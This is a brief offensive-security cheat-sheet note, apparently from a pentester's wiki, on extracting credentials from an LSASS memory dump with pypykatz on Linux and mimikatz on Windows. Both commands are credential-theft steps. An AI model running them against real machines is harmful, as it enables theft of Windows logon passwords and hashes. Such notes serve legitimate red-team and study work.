---
title: LSASS Dump Extraction
---

With [[notes/tools/pypykatz]] on Linux.

~~~ bash
pypykatz lsa minidump ./lsass.dmp
~~~

With [[notes/tools/mimikatz]] on Windows.

~~~ cmd
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords exit
~~~
